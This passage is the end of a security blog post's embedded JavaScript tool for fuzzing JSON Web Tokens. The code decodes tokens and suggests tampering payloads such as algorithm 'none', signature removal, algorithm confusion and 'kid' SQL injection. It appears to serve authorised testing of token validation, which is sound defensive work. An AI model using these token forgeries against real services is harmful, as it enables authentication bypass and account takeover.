if(!Number.isInteger(jwtBody.exp)) return 'JWT Payload `exp` value is not an integer'; if(!splitToken[2]) return `JWT does not contain a Signature`; if(!jwtHeader.hasOwnProperty('alg')) return 'JWT Header does not contain the `alg` key'; if(!jwtBody.hasOwnProperty('iat')) return 'JWT Payload does not contain the `iat` key'; if(!jwtBody.hasOwnProperty('exp')) return 'JWT Payload does not contain the `exp` key'; /* All checks passed */ return false; } catch (err) { return 'Processing of the JWT caused an unexpected error'; } }; function updateSessionInfo() { try { let jwt = getJwtFromFields(); if (typeof(jwt) === 'string' && jwt === 'ERROR: Failed to Encode JWT Payload as JSON') { throw new Error(jwt); } else { /* If the error wasn't with the JWT Payload, attempt to continue */ jwt = {}; jwt.payload = JSON.parse(document.getElementById('jwtBody').value); } let iatTime = new Date(jwt.payload.iat*1000); let expTime = new Date(jwt.payload.exp*1000); /* Show the IssueAt time on-screen */ document.getElementById('jwtSessionTime').innerText = `${Math.round((expTime - iatTime)/1000)} seconds`; /* Show the IssueAt time on-screen */ document.getElementById('jwtIssuedAt').innerText = `JWT was issued at ${(iatTime).toLocaleString()}`; /* Show the Expiration time on-screen */ if(expTime > new Date()) { document.getElementById('jwtExpiresAt1').innerText = `valid`; document.getElementById('jwtExpiresAt1').style.color = `LawnGreen`; document.getElementById('jwtExpiresAt2').innerText = ` and expires at ${(expTime).toLocaleString()} (in ${getTimeDifference(expTime)})`; } else { document.getElementById('jwtExpiresAt1').innerText = `not valid`; document.getElementById('jwtExpiresAt1').style.color = `Red`; document.getElementById('jwtExpiresAt2').innerText = ` and expired at ${(expTime).toLocaleString()} (${getTimeDifference(expTime)} ago)`; } document.getElementById('sessionInfo').style.display = 'block'; } catch (err) { document.getElementById('sessionInfo').style.display = 'none'; document.getElementById('jwtIssuedAt').innerText = ''; document.getElementById('jwtExpiresAt1').innerText = ''; document.getElementById('jwtExpiresAt2').innerText = ''; } } function createPayloads() { try { let jwt = getJwtFromFields(); if (typeof(jwt) === 'string' && jwt.startsWith('ERROR: ')) { throw new Error(jwt); } document.getElementById('secondaryBlock').style.display = 'block'; /* Display the suggested payloads */ let suggestedPayloadsListContainer = document.getElementById('suggestedPayloads'); suggestedPayloadsListContainer.innerHTML = ''; let suggestPayloads = [ 'Algorithm \'none\'', 'Algorithm \'none\' & Remove Signature', 'Null Byte Injection', 'Invalid Header Base64', 'Invalid Payload Base64', 'Invalid Header JSON', 'Invalid Payload JSON', 'Invalid Algorithm', 'Invalid Type', 'Invalid Signature', 'Invalid Signature with Bad Characters', 'Modify IssuedAt (\'iat\') & Expiration(\'exp\')', 'Large Number for IssuedAt (\'iat\') & Expiration(\'exp\')', 'Remove Algorithm', 'Remove Type', 'Remove Signature', 'Empty Header', 'Empty Payload' ]; if (jwt.header.hasOwnProperty('alg') && (jwt.header.alg.startsWith('HS') || jwt.header.alg.startsWith('RS') || jwt.header.alg.startsWith('ES') || jwt.header.alg.startsWith('PS'))) { suggestPayloads.push('Modify Algorithm (RS256 -> HS256, HS256 -> RS256, RS256 -> RS512, etc)'); suggestPayloads.push('Modify Algorithm & Remove Signature'); } if(jwt.header.hasOwnProperty('kid')) { suggestPayloads.push('Modify \'kid\''); suggestPayloads.push('\'kid\' SQL Injection'); } /* Add the suggested payloads to the unordered list */ suggestPayloads.forEach(suggestedPayload => { let childElement = document.createElement('li'); childElement.innerText = suggestedPayload; suggestedPayloadsListContainer.appendChild(childElement); }); let payloadListContainer = document.getElementById('payloadList'); /* Clear the div of Unordered Lists */ payloadListContainer.innerHTML = ''; let totalSuggestPayloads = 0; let listsToAdd = []; let currentList = null; /* If the JWT has been edited, so the edited JWT as well in the payload list */ if (joinComponents(jwt.header, jwt.payload, jwt.signature) !== document.getElementById('jwtPayload').value.trim()) { let title = document.createElement('h5'); title.innerText = 'Edited JWT'; listsToAdd.push(title); currentList = document.createElement('ui'); currentList.style.display = 'block'; currentList.style['padding-left'] = '40px'; let childElement = document.createElement('li'); if (showDecodedJwts) { let splitPieces = joinComponents(jwt.header, jwt.payload, jwt.signature).split('.'); try { splitPieces[0] = atob(splitPieces[0]); } catch (err) { splitPieces[0] = "Failed-To-Decode-Header" } try { splitPieces[1] = atob(splitPieces[1]); } catch (err) { splitPieces[1] = "Failed-To-Decode-Payload" } childElement.innerText = splitPieces.join('.'); } else { childElement.innerText = joinComponents(jwt.header, jwt.payload, jwt.signature); } currentList.appendChild(childElement); totalSuggestPayloads++; } /* Generate the JWT payloads */ let results = generatePayloads(jwt.header, jwt.payload, jwt.signature); /* Add all the output payloads to the unordered list */ results.forEach(outputPayload => { if (outputPayload.startsWith('$$@@') && outputPayload.endsWith('@@$$')) { if (currentList) listsToAdd.push(currentList); currentList = document.createElement('ui'); currentList.style.display = 'block'; currentList.style['padding-left'] = '40px'; let title = document.createElement('h5'); title.innerText = outputPayload.replace('$$@@', '').replace('@@$$', ''); listsToAdd.push(title); } else { /* Correct way of updating text instead of raw concatenation and setting innerHTML. Because XSS is bad. */ let childElement = document.createElement('li'); if (showDecodedJwts) { let splitPieces = outputPayload.split('.'); try { splitPieces[0] = atob(splitPieces[0]); } catch (err) { splitPieces[0] = "Failed-To-Decode-Header" } try { splitPieces[1] = atob(splitPieces[1]); } catch (err) { splitPieces[1] = "Failed-To-Decode-Payload" } childElement.innerText = splitPieces.join('.'); } else { childElement.innerText = outputPayload; } currentList.appendChild(childElement); totalSuggestPayloads++; } }); /* Add the final Unordered List */ if (currentList) listsToAdd.push(currentList); listsToAdd = listsToAdd.filter((element, index) => { /* If this element is a list, and is empty, don't include it */ if (element.tagName === 'UI' && Object.keys(element.children).length === 0) return false; /* If this element is a title, and the next element is an empty list, don't include this title */ if (element.tagName === 'H5' && Object.keys(listsToAdd[index+1].children).length === 0) return false; return true; }); /* Add the Unordered Lists to the jwt payloads div. */ listsToAdd.forEach(suggestedPayloadGroup => { payloadListContainer.appendChild(suggestedPayloadGroup); }); /* Update the field telling the user how many payloads there are */ document.getElementById('totalPayloads').innerText = `Total JWT Payloads: ${totalSuggestPayloads}`; document.getElementById('jwtFieldsError').innerText = ''; } catch (err) { /* Show error saying Header/Payload is not a valid JSON */ document.getElementById('jwtFieldsError').innerText = err.message; document.getElementById('secondaryBlock').style.display = 'none'; } } function jwtTokenChanged() { try { let jwt = document.getElementById('jwtPayload').value; let storeToken = window.sessionStorage.getItem('storeJwtToken') || null; /* Only temp store the token if the allowed */ if(storeToken === 'true') { window.sessionStorage.setItem('jwtPayload', (jwt || '')); } let isIssuesWithJwt = checkIfJwt(jwt); if(!isIssuesWithJwt) { let jwtObj = { header: JSON.parse(atob(jwt.split('.')[0])), body: JSON.parse(atob(jwt.split('.')[1])), signature: jwt.split('.')[2] }; let stringHeader = JSON.stringify(jwtObj.header, null, 2); let stringBody = JSON.stringify(jwtObj.body, null, 2); document.getElementById('mainBlock').style.display = 'block'; document.getElementById('errorsWithJwt').innerText = ``; document.getElementById('jwtHeader').value = stringHeader; document.getElementById('jwtHeader').rows = (stringHeader.match(/\n/g) || []).length + 1; document.getElementById('jwtBody').value = stringBody; document.getElementById('jwtBody').rows = (stringBody.match(/\n/g) || []).length + 1; document.getElementById('jwtSignature').value = jwtObj.signature; /* Only store data if the option has been enabled */ if ((window.sessionStorage.getItem('storeJwtToken') || null) === 'true') { window.sessionStorage.setItem('jwtFieldHeader', document.getElementById('jwtHeader').value); window.sessionStorage.setItem('jwtFieldPayload', document.getElementById('jwtBody').value); window.sessionStorage.setItem('jwtFieldSignature', document.getElementById('jwtSignature').value); } updateSessionInfo(); createPayloads(); } else { if(isIssuesWithJwt === 'empty') { document.getElementById('errorsWithJwt').innerText = ``; } else { document.getElementById('errorsWithJwt').innerText = `ERROR: ${isIssuesWithJwt}`; } document.getElementById('jwtHeader').value = ''; document.getElementById('jwtBody').value = ''; document.getElementById('jwtSignature').value = ''; window.sessionStorage.removeItem('jwtFieldHeader'); window.sessionStorage.removeItem('jwtFieldPayload'); window.sessionStorage.removeItem('jwtFieldSignature'); document.getElementById('jwtSessionTime').innerText = ``; document.getElementById('jwtIssuedAt').innerText = ``; document.getElementById('suggestedPayloads').innerHTML = ''; document.getElementById('payloadList').innerHTML = ''; document.getElementById('totalPayloads').innerText = `Total Payloads: 0`; document.getElementById('mainBlock').style.display = 'none'; } } catch (err) {} } function jwtFieldEdited(fieldChanged) { let storeToken = window.sessionStorage.getItem('storeJwtToken') || null; let valueToSave; if(storeToken === 'true') { if(fieldChanged === 'jwtFieldHeader') { valueToSave = document.getElementById('jwtHeader').value; } else if (fieldChanged === 'jwtFieldPayload') { valueToSave = document.getElementById('jwtBody').value; } else if (fieldChanged === 'jwtFieldSignature') { valueToSave = document.getElementById('jwtSignature').value; } window.sessionStorage.setItem(fieldChanged, valueToSave); } createPayloads(); } function copyAllToClipboard(includedDecodedPayloads) { let tokensToCopy = []; /* Create a list of the payloads */ Object.values(document.getElementById('payloadList').children).forEach(child => { /* Only copy the list elements, not the headings */ if (child.tagName === 'UI') { Object.values(child.children).forEach(listChild => { tokensToCopy.push(listChild.innerText); }); } }); /* Get the text field */ let copyElement = document.createElement('textarea'); copyElement.value = tokensToCopy.join('\n'); copyElement.setAttribute('readonly', ''); document.body.appendChild(copyElement); /* Select the text field */ copyElement.select(); /* For mobile devices */ copyElement.setSelectionRange(0, 99999); /* Copy the text inside the text field */ document.execCommand("copy"); document.body.removeChild(copyElement); } /* Store the preference of whether to temp store the token or not */ function radioChange(newValue) { if(newValue) { window.sessionStorage.setItem('storeJwtToken', 'true'); window.sessionStorage.setItem('jwtPayload', (document.getElementById('jwtPayload').value || '').trim()); window.sessionStorage.setItem('jwtFieldHeader', document.getElementById('jwtHeader').value.trim()); window.sessionStorage.setItem('jwtFieldPayload', document.getElementById('jwtBody').value.trim()); window.sessionStorage.setItem('jwtFieldSignature', document.getElementById('jwtSignature').value.trim()); } else { window.sessionStorage.setItem('storeJwtToken', 'false'); window.sessionStorage.removeItem('jwtPayload'); window.sessionStorage.removeItem('jwtFieldHeader'); window.sessionStorage.removeItem('jwtFieldPayload'); window.sessionStorage.removeItem('jwtFieldSignature'); } } function generateTestJwt() { let names = "adrian,alex,alfred,alison,andrew,angela,anthony,ben,brenda,carol,caroline,christina,christine,christopher,clare,colin,craig,david,deborah,edward,elaine,gabrielle,geoffrey,helen,ian,james,jane,jill,john,judith,julie,karen,katherine,kelly,kevin,laura,lesley,lindsey,mark,martin,mary,matt,matthew,michael,michele,michelle,patricia,paul,pauline,peter,phillip,rachael,richard,ruth,sharon,shaun,sheila,simon,stephen,steven,stuart,suzanne,terence,thomas,trevor,william".split(','); let roles = "admin,manager,system-engineer,senior-consultant,consultant".split(','); let algs = "HS256,HS384,HS512,RS256,RS384,RS512,ES256,ES384,ES512,PS256,PS384,PS512".split(','); let validFor = [300, 600, 900, 1800, 2700, 3600, 7200]; let hexChars = '0123456789abcdef'.split(''); let header = { alg: algs[Math.floor(Math.random()*algs.length)], typ: 'JWT' }; if (Math.random() < 0.5) { header.kid = Math.floor(Math.random()*50000000 + 50000000); } let payload = { name: names[Math.floor(Math.random()*names.length)], role: roles[Math.floor(Math.random()*roles.length)], iat: Math.floor((new Date()).getTime()/1000 - (Math.floor(Math.random()*1200))) }; payload.exp = payload.iat + validFor[Math.floor(Math.random()*validFor.length)]; if (Math.random() < 0.5) { payload['token-id'] = []; for (let i = 0; i < 8; ++i) { payload['token-id'].push(hexChars[Math.floor(Math.random()*hexChars.length)]); } payload['token-id'].push('-'); for (let i = 0; i < 4; ++i) { payload['token-id'].push(hexChars[Math.floor(Math.random()*hexChars.length)]); } payload['token-id'].push('-'); for (let i = 0; i < 4; ++i) { payload['token-id'].push(hexChars[Math.floor(Math.random()*hexChars.length)]); } payload['token-id'].push('-'); for (let i = 0; i < 4; ++i) { payload['token-id'].push(hexChars[Math.floor(Math.random()*hexChars.length)]); } payload['token-id'].push('-'); for (let i = 0; i < 8; ++i) { payload['token-id'].push(hexChars[Math.floor(Math.random()*hexChars.length)]); } payload['token-id'] = payload['token-id'].join(''); } let signature = []; let signatureSize = parseInt(header.alg.match(/\d{3}/)[0]) / 4; for (let i = 0; i < signatureSize; ++i) { signature.push(hexChars[Math.floor(Math.random()*hexChars.length)]); } signature = signature.join('').match(/../g).map(x => String.fromCharCode(parseInt(x, 16))).join(''); signature = btoa(signature).replace(/\=/g, ''); let finalJwt = btoa(JSON.stringify(header)).replace(/\=/g, '') + '.' + btoa(JSON.stringify(payload)).replace(/\=/g, '') + '.' + signature; document.getElementById('jwtPayload').value = finalJwt; jwtTokenChanged(); } function clearJwt() { document.getElementById('jwtPayload').value = ''; jwtTokenChanged(); } /* Get saved preference of whether to temp store the token */ let storeJwtToken = window.sessionStorage.getItem('storeJwtToken') || null; /* Set the initial state of whether to temp store the token or not */ if(storeJwtToken === 'true') { document.getElementById('storeJwtToken').checked = true; } else if(storeJwtToken === 'false') { document.getElementById('doNotStoreJwtToken').checked = true; window.sessionStorage.removeItem('jwtPayload'); window.sessionStorage.removeItem('jwtFieldHeader'); window.sessionStorage.removeItem('jwtFieldPayload'); window.sessionStorage.removeItem('jwtFieldSignature'); } else { document.getElementById('storeJwtToken').checked = true; window.sessionStorage.setItem('storeJwtToken', true); } /* Check if there is a token in session storage */ let savedJwtTokenData = (window.sessionStorage.getItem('jwtPayload') || '').toString(); /* Update the text area with the value if there is a stored token */ if(storeJwtToken === 'true' && savedJwtTokenData) { document.getElementById('jwtPayload').value = savedJwtTokenData; document.getElementById('mainBlock').style.display = 'block'; document.getElementById('jwtHeader').value = (window.sessionStorage.getItem('jwtFieldHeader') || '').toString(); document.getElementById('jwtHeader').rows = (document.getElementById('jwtHeader').value.match(/\n/g) || []).length + 1; document.getElementById('jwtBody').value = (window.sessionStorage.getItem('jwtFieldPayload') || '').toString(); document.getElementById('jwtBody').rows = (document.getElementById('jwtBody').value.match(/\n/g) || []).length + 1; document.getElementById('jwtSignature').value = (window.sessionStorage.getItem('jwtFieldSignature') || '').toString(); createPayloads(); } else { jwtTokenChanged(); } setInterval(updateSessionInfo, 500); </script></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/tools/'>tools</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tools/" class="post-tag no-text-decoration" >tools</a> <a href="/tags/security/" class="post-tag no-text-decoration" >security</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/http/" class="post-tag no-text-decoration" >http</a> <a href="/tags/https/" class="post-tag no-text-decoration" >https</a> <a href="/tags/jwt/" class="post-tag no-text-decoration" >jwt</a> <a href="/tags/cryptography/" class="post-tag no-text-decoration" >cryptography</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=JWT Fuzzing - Node Security&url=https://node-security.com/posts/jwt-fuzzing/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=JWT Fuzzing - Node Security&u=https://node-security.com/posts/jwt-fuzzing/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=JWT Fuzzing - Node Security&url=https://node-security.com/posts/jwt-fuzzing/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/building-a-plexus/">Building a Plexus</a><li><a href="/posts/web-workers/">Web Workers</a><li><a href="/posts/jwt-fuzzing/">JWT Fuzzing</a><li><a href="/posts/ssh-server-hardening/">SSH Server Hardening</a><li><a href="/posts/when-do-options-requests-get-sent/">When are OPTIONS Requests Sent?</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/javascript/">javascript</a> <a class="post-tag" href="/tags/nodejs/">nodejs</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/https/">https</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/http/">http</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/programming/">programming</a> <a class="post-tag" href="/tags/algorithm/">algorithm</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/when-do-options-requests-get-sent/"><div class="card-body"> <span class="timeago small" > May 15 <i class="unloaded">2021-05-15T10:41:50+10:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>When are OPTIONS Requests Sent?</h3><div class="text-muted small"><p> In this post we’ll look at OPTIONS requests, when they get sent, and their security implications. A basic understanding of CORS and CSRF attacks would be beneficial before reading this post. S...</p></div></div></a></div><div class="card"> <a href="/posts/using-wget/"><div class="card-body"> <span class="timeago small" > May 18 <i class="unloaded">2021-05-18T21:48:55+10:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Using Wget</h3><div class="text-muted small"><p> How to perform requests using wget and setup a http proxy for wget. API Call wget https://testing.com/login Ignore Cert Issues --no-check-certificate Add Headers --header 'Authorization: Basic ...</p></div></div></a></div><div class="card"> <a href="/posts/openssl-creating-a-host-certificate/"><div class="card-body"> <span class="timeago small" > Apr 7 <i class="unloaded">2021-04-07T21:03:48+10:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OpenSSL Creating a Host Certificate</h3><div class="text-muted small"><p> In this post we’ll look at how to create our own Host Certificates using OpenSSL. These certificates can be used on web-servers for enabling TLS. A valid CA Certificate and Private key will be req...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/ssh-server-hardening/" class="btn btn-outline-primary" prompt="Older"><p>SSH Server Hardening</p></a> <a href="/posts/filter-and-map/" class="btn btn-outline-primary" prompt="Newer"><p>Filter and Map</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/twitter_username">Alexander Wells</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/javascript/">javascript</a> <a class="post-tag" href="/tags/nodejs/">nodejs</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/https/">https</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/http/">http</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/programming/">programming</a> <a class="post-tag" href="/tags/algorithm/">algorithm</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://node-security.com{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
